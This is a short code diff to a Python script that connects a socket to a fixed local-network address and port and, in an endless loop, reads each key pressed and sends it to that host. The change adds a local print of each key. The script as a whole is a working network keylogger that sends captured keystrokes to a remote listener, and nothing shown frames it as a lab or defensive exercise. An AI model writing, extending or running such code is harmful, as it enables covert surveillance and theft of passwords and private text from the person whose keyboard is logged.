@@ -7,4 +7,6 @@ target = ['192.168.68.121', 56774]
 client.connect(target)
 
 while True:
-    client.send(keyboard.read_key())
+    pressed = keyboard.read_key()
+    print('pressed:', pressed)
+    client.send(pressed)
